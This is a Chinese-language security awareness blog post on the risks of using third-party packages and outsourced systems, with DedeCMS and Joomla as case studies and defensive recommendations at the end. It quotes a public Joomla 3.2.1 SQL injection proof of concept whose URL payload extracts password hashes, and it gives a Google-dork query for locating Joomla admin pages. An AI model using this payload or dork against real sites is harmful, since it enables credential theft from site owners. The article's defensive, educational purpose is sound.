---

title: "使用第三方套件所要擔負的資安風險"
description: "使用第三方套件節省開發時間，已經是整個資訊產業的慣例。但很多人可能不知道，使用第三方套件到底需要擔負多大的資安風險。你確定你用的套件是安全無虞的嗎？是否有經過嚴謹的安全測試？若有安全漏洞引爆，是否有廠商可以負責維護修補？這些都是在使用之前必須要考慮的。本文將以案例探討第三方套件的安全性，並且提出企業該有的應對措施。"
category: "科普文章"
tags: [OpenSource, Vulnerability]
author: "allenown"
keywords: "opensource, 第三方套件"
---


使用第三方套件節省開發時間，已經是整個資訊產業的慣例。但是很多管理者可能不知道，使用第三方套件到底需要擔負多大的資安風險。你確定你用的套件是安全無虞的嗎？是否有經過嚴謹的安全測試？若有安全漏洞引爆，是否有廠商可以負責維護修補？廠商開發的程式碼品質是否穩定？這些都是在使用之前必須要考慮的。

在服務眾多客戶之後，我們深知這些問題的嚴重性。以下我們將就幾個經典的案例來說明使用第三方套件所要擔負的風險，並且分享我們對於第三方套件的安全建議。

READMORE

### 程式碼的安全性？

程式碼的品質直接決定了系統的安全性。如果一個套件有以下幾點因素：

1. 程式開發已久難以修改
2. 開發人員無安全觀念
3. 大量整合外部套件，無法控管每個套件安全

可能就因為程式碼難以修改，形成漏洞百出的程式架構。若是之後陸續發生安全問題，儘管不斷的修補漏洞，但卻會因為程式碼的設計、架構等因素，造成日後依舊陸續有安全疑慮。

### 案例說明：DedeCMS

[DedeCMS](http://www.dedecms.com/) 是知名的內容管理系統，不少公司拿此套件架設網站、部落格等。但在這幾個月，在「[烏雲平台](http://wooyun.org)」上陸續有人揭露 DedeCMS 的漏洞。包括大量各種 SQL Injection、Cross-Site Scripting 弱點等等，甚至還包括 Command Execution 問題。如果沒有即時修正這些問題，小則造成用戶帳號被盜，大則造成整台主機被入侵，取得作業系統權限。

[![烏雲漏洞報告平台](https://lh3.googleusercontent.com/-oPACG8e-4t0/Ux3lMIP6NVI/AAAAAAAAAKc/V9RKKU7mz1A/w600/blog_3rd_party_security_00.png "烏雲漏洞報告平台")
](https://lh3.googleusercontent.com/-oPACG8e-4t0/Ux3lMIP6NVI/AAAAAAAAAKc/V9RKKU7mz1A/w960-h678-no/blog_3rd_party_security_00.png)

什麼系統沒被找到漏洞過呢？有那麼嚴重嗎？但該系統已經不只一次出現重大漏洞導致企業遭到入侵，在今年一二月份更是遭揭露多達十數個高風險 SQL Injection 資料庫注入漏洞。此現象凸顯該套件的設計並未經過安全測試，並且採用不安全的程式撰寫方式，未來可能會有更多隱含的漏洞釋出。

[![dedecms漏洞於烏雲平台](https://lh6.googleusercontent.com/-JIR-uh9OveA/Ux3lMKjdogI/AAAAAAAAAKY/ZmWDD7Yg-js/w600/blog_3rd_party_security_02.png "dedecms漏洞於烏雲平台")](https://lh6.googleusercontent.com/-JIR-uh9OveA/Ux3lMKjdogI/AAAAAAAAAKY/ZmWDD7Yg-js/w1218-h860-no/blog_3rd_party_security_02.png)

在平台中搜尋關鍵字「DedeCMS」，會發現漏洞提報的次數相當多，在漏洞的評論中也有不少技術人員進行討論。但更多的疑惑是為什麼 DedeCMS 會一再的發生資安問題。例如以下漏洞：

* [Dedecms某命令執行漏洞](http://wooyun.org/bugs/wooyun-2014-052010)
* [DedeCMS全版本通殺SQL注入(真正的無任何限制附官方測試結果)](http://wooyun.org/bugs/wooyun-2014-051950)  
* [DedeCMS全版本通殺SQL注入(無任何限制)](http://wooyun.org/bugs/wooyun-2014-051889) 
* [Dedecms某命令执行漏洞（续）](http://www.wooyun.org/bugs/wooyun-2014-052792)

[![dedecms漏洞於烏雲平台](https://lh4.googleusercontent.com/-TD5ZDIQe4K4/Ux3lMyME3vI/AAAAAAAAAKg/BlLdMesp0MI/w600/blog_3rd_party_security_03.png "dedecms漏洞於烏雲平台")](https://lh4.googleusercontent.com/-TD5ZDIQe4K4/Ux3lMyME3vI/AAAAAAAAAKg/BlLdMesp0MI/w1218-h860-no/blog_3rd_party_security_03.png)

而於另一個「[Sebug 安全漏洞信息庫](http://sebug.net)」也可以看到不少 DedeCMS 的蹤影。

[![sebug安全漏洞信息庫](https://lh6.googleusercontent.com/-5YS9t-YHgKk/Ux3lMMmjbqI/AAAAAAAAAKU/FWFu1liQdks/w600/blog_3rd_party_security_01.png "sebug安全漏洞信息庫")](https://lh6.googleusercontent.com/-5YS9t-YHgKk/Ux3lMMmjbqI/AAAAAAAAAKU/FWFu1liQdks/w1218-h860-no/blog_3rd_party_security_01.png)

如果官方在第一時間就能接獲通報、了解問題並修正解決，提供更新程式給客戶更新，那安全的風險會小些。但在官方尚未釋出更新的這段時間，網站將完全的暴露在風險當中。有心人士看到套件的漏洞陸續被揭露，也會更有興趣尋找使用該套件的網站攻擊。

### 案例說明：Joomla!

[Joomla!](http://www.joomla.org) 是另一套國際非常知名的 CMS 系統，因為其便利性，很多企業、學校、政府單位，都採用此套件建立網站。透過 Google Hacking 方式可以找到台灣非常多網站都使用 Joomla! 架站。

<pre>
site:tw intitle:管理區 inurl:administrator
</pre>

[![Google Hacking 尋找 Joomla!](https://lh3.googleusercontent.com/-_PP2U3n_zW8/Ux77uXKLAnI/AAAAAAAAAME/_e8VIuM_ATQ/w600/blog_3rd_party_security_04.png "Google Hacking 尋找 Joomla!")](https://lh3.googleusercontent.com/-_PP2U3n_zW8/Ux77uXKLAnI/AAAAAAAAAME/_e8VIuM_ATQ/w1218-h860-no/blog_3rd_party_security_04.png)

但是如果今天這個系統出了問題呢？「Joomla!」因為外掛、套件眾多，也經常成為漏洞發掘的對象。在 2014/02/05，國外釋出了一個 SQL Injection Exploit，可以導致網站帳號密碼直接被導出。

官方安全公告：[http://developer.joomla.org/security/578-20140301-core-sql-injection.html](http://developer.joomla.org/security/578-20140301-core-sql-injection.html)

Secunia: Joomla! Multiple Vulnerabilities [http://secunia.com/advisories/56772/](http://secunia.com/advisories/56772/)

Exploit 位址：[http://www.exploit-db.com/exploits/31459/](http://www.exploit-db.com/exploits/31459/)

{% highlight html %}
# Exploit Title: Joomla 3.2.1 sql injection
# Date: 05/02/2014
# Exploit Author: kiall-9@mail.com
# Vendor Homepage: http://www.joomla.org/
# Software Link: http://joomlacode.org/gf/download/frsrelease/19007/134333/Joomla_3.2.1-Stable-Full_Package.zip
# Version: 3.2.1 (default installation with Test sample data)
# Tested on: Virtualbox (debian) + apache
POC=>
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=\
 
will cause an error:
 
1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\)' at line 3 SQL=SELECT `t`.`id` FROM `k59cv_tags` AS t INNER JOIN `k59cv_contentitem_tag_map` AS m ON `m`.`tag_id` = `t`.`id` AND `m`.`type_alias` = 'com_weblinks.categories' AND `m`.`content_item_id` IN ( \) Array ( [type] => 8 [message] => Undefined offset: 0 [file] => /var/www/Joomla_3.2.1/libraries/joomla/filter/input.php [line] => 203 )
 
I modified the original error.php file with this code --- <?php print_r(error_get_last()); ?> --- in order to obtain something useful. ;-)
 
Now i can easily exploit this flaw:
 
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=0%20%29%20union%20select%20password%20from%20%60k59cv_users%60%20--%20%29
and obtain the hash:
 
1054 Unknown column '$P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1' in 'where clause' SQL=SELECT `m`.`tag_id`,`m`.`core_content_id`,`m`.`content_item_id`,`m`.`type_alias`,COUNT( `tag_id`) AS `count`,`t`.`access`,`t`.`id`,`ct`.`router`,`cc`.`core_title`,`cc`.`core_alias`,`cc`.`core_catid`,`cc`.`core_language` FROM `k59cv_contentitem_tag_map` AS `m` INNER JOIN `k59cv_tags` AS `t` ON m.tag_id = t.id INNER JOIN `k59cv_ucm_content` AS `cc` ON m.core_content_id = cc.core_content_id INNER JOIN `k59cv_content_types` AS `ct` ON m.type_alias = ct.type_alias WHERE `m`.`tag_id` IN ($P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1) AND t.access IN (1,1) AND (`m`.`content_item_id` <> 0 ) union select password from `k59cv_users` -- ) OR `m`.`type_alias` <> 'com_weblinks.categories') AND `cc`.`core_state` = 1 GROUP BY `m`.`core_content_id` ORDER BY `count` DESC LIMIT 0, 5
 
CheerZ>
{% endhighlight %}

值得注意一看的是[官方公告](http://developer.joomla.org/security/578-20140301-core-sql-injection.html)，上面標註著漏洞回報時間以及修補時間。2014/2/6 接獲回報，2014/3/6 修復。在這整整一個月的時間之內，所有適用版本內的 Joomla! 網站都將受此漏洞影響。因此套件廠商的反應修復速度越慢，顧客暴露在風險之中的時間越長。

{% highlight html %}
Project: Joomla!
SubProject: CMS
Severity: High
Versions: 3.1.0 through 3.2.2
Exploit type: SQL Injection
Reported Date: 2014-February-06
Fixed Date: 2014-March-06
CVE Number: Pending
{% endhighlight %}

### 案例說明：外包廠商

 <iframe src="//embed.gettyimages.com/embed/147456329?et=tHsuT-4nxk-4NvmLZycwCA&amp;sig=Z5X7iFr5V9vS70tCT49wQA8EldpRXSuV3jpoBtgTmg4=" width="507" height="406" frameborder="0" scrolling="no"> </iframe>

這樣的情境你是否熟悉？

公司有一套客製化的系統需要建置，但是因為公司內部開發人員不足，因此把這個系統外包出去給廠商做。貨比三家不吃虧，比了 A B C 三家，發現 A 家最便宜實惠，交貨時間又短。決定就把這個系統發包給 A 廠商做。半年過去了，這個廠商順利交貨結案。

一年過後，發現這個系統竟然遭到入侵，主動攻擊內部其他伺服器。「不是有買防火牆嗎？怎麼還會被入侵？」老闆說。這可嚴重了，馬上找廠商來刮一頓。沒想到，A 廠商表示，該案已經順利結案，維護期也已經過了，沒辦法提供協助，除非繼續簽訂維護合約。問題總得解決，簽訂了維護合約之後，A 廠商也協助把病毒砍掉了。圓滿結束？事情有那麼簡單嗎？

過了兩天，系統又開始攻擊其他伺服器。「病毒不是已經砍掉了嗎？」老闆說。問題在哪大家應該都很清楚。在尋找資安廠商協助之下，發現主機是因為 A 廠商設計的系統含有漏洞，導致 SQL Injection 問題，遭攻擊者利用植入惡意程式。A 廠商百般無奈，摸摸鼻子把這個漏洞修補起來。又過了兩天，再度遭到入侵。看了看，發現又是另一個 SQL Injection 問題。在幾次與攻擊者的不斷角力之下，終於好像把問題都修完了。

過了一週，系統再度有惡意程式的蹤跡，A 廠商也無能為力。資安廠商表示，買這個就對了！在陸續被迫買了防火牆、WAF、IDS 等設備後，雖然問題貌似改善，但系統仍然零星有入侵事件發生。公司只好「斷然處置」，等待下次預算，另請廠商重新開發系統。

* 問題 1：該系統是否還有其他漏洞？
* 問題 2：公司的處置是否正確？
* 問題 3：A 廠商的其他客戶是否有類似的問題？
* 問題 4：不是有買資安設備？為什麼還會有資安事件？
* 問題 5：公司該如何自保？
* 問題 6：廠商該如何自保？

想一下以上各點問題。

* 問題 1：該系統是否還有其他漏洞？

如果一個在開發時期就沒有注意安全的系統，很有可能有更多不為人知的漏洞。如果被動依賴資安事件，發生一件修一個漏洞，那是永無止盡的。正確的方式應該是直接針對 A 廠商的原始碼進行黑箱[滲透測試](http://devco.re/services/penetration-test)、白箱源碼檢測 (Code Review)，才能快速找出所有風險。

* 問題 2：公司的處置是否正確？

「貨比三家不吃虧」，節儉確實是美德，但是在資訊產業中，越便宜的系統可能代表著更多的 cost down，除了犧牲掉品質之外，可能帶給企業更多損失。在資安事件發生時，一定要找原本維運廠商負責，並且與資安顧問公司配合，協助廠商把問題解決。

* 問題 3：A 廠商的其他客戶是否有類似的問題？

羅馬不是一日造成的，不安全的系統也不是一個漏洞造成的。廠商通常是做出一份系統，客製化販賣給不同的企業用戶。如果在建置的過程中沒有注意安全問題，今天這家客戶有這個漏洞，別的客戶一定也會有。因此如果採用了不良的廠商實作的系統，下一個被駭的可能就是自己。

* 問題 4：不是有買資安設備？為什麼還會有資安事件？

「不是有買防火牆嗎？怎麼還會被入侵？」是很多傳統思維企業的共同心聲。防火牆不是萬靈丹，駭客也絕對不是電腦。並不是完全依賴資安設備就能夠避免資安問題。在駭客的手法中，更多是如何繞過各種防禦設備手段，甚至有些資安設備本身竟然含有資安弱點，企業反而因為資安設備導致系統被入侵。

正確的思維應該是從人開始做起，建立正確的資安觀念、資安思維，學習駭客的思維。建立正確的系統開發流程、建立正確的資安事件處理流程。尋找信譽良好的資安顧問廠商，定期針對企業內部各系統進行滲透測試、弱點掃描。安全的建立絕非一蹴可及，唯有一步步踏穩才能走得更遠。

* 問題 5：公司該如何自保？
* 問題 6：廠商該如何自保？

請看下一個章節「建議對策」。


### 建議對策

[![Countermeasure](http://farm6.staticflickr.com/5280/5895021311_3aaef7fec0_z.jpg "Countermeasure")](http://www.flickr.com/photos/26604430@N05/5895021311/)

一個安全的系統，絕對是由基礎建設開始，每個環節都兼顧到安全的設計，並且定期稽核程式碼安全，使用正確安全的方式開發。如果系統開發初期就沒有兼顧安全，後期不管怎麼修補，都還是會有漏洞讓攻擊者有機可趁。

企業該如何自保？使用 OpenSource 第三方套件或者是系統委外開發，是企業無可避免的。如果是第三方套件，平時可以多加注意套件的資安消息，如果一有新的漏洞被發現，將可以在第一時間應變。若沒有足夠人力密切注意資安消息，也可以委請資安顧問廠商協助，在得知資安消息的第一時間通報企業。委外開發的系統，企業可以要求廠商提出專業公正第三方資安公司進行檢測，並且提出安全報告，證明該系統有經過滲透測試等安全檢測，保障雙方的權利。

如果系統已經被入侵了，或者是被揭露了安全漏洞，該如何自保呢？在漏洞大量揭露的情況下，系統更會成為攻擊者的目標。因此要務必密切注意使用該套件的伺服器狀況，並且遵循以下原則：

* 密切注意官方的更新程式並立即更新
* 此台伺服器的帳號密碼切勿與他台共用
* 將此台伺服器與其他伺服器隔離，避免遭入侵時受害範圍擴大
* 異地備份伺服器的系統記錄，並定時檢閱記錄，觀察是否有可疑行為
* 考慮採用 Web Application Firewall (WAF)、ModSecurity 伺服器安全模組，增加攻擊難度
* 重新評估使用遭入侵套件的必要性以及安全考量，避免成為企業的隱含風險

使用第三方套件加速開發節省成本的同時，務必也要考慮安全的問題，才不會因小失大，造成企業更大的損失。同時企業也必須增加資安的素養以及了解攻擊者的思維，別讓自己的企業成為下一個資安事件報導的對象。

